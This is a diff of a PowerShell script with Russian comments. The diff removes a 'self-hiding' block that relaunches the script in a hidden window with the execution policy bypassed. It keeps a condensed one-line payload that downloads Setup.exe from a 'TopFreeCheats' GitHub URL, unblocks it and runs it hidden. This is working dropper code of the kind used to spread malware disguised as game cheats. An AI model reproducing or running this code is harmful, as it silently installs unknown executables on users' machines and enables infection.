@@ -1,17 +1,1 @@
-# --- само-сокрытие ---
-if (-not $env:WORM_HIDDEN) {
-    $env:WORM_HIDDEN = '1'
-    Start-Process powershell -ArgumentList @(
-        '-NoProfile','-ExecutionPolicy','Bypass',
-        '-WindowStyle','Hidden',
-        '-File', "`"$PSCommandPath`""
-    ) -WindowStyle Hidden
-    exit
-}
-
-# --- дальше идёт "полезная" часть ---
-$u = 'https://raw.githubusercontent.com/TopFreeCheats/1/main/Setup.exe'
-$f = "$env:TEMP\Setup.exe"
-(New-Object Net.WebClient).DownloadFile($u, $f)
-Unblock-File $f
-Start-Process $f -Wait -WindowStyle Hidden
+$u='https://raw.githubusercontent.com/TopFreeCheats/1/main/Setup.exe';$f="$env:TEMP\Setup.exe";(New-Object Net.WebClient).DownloadFile($u,$f);Unblock-File $f;Start-Process $f -Wait -WindowStyle Hidden
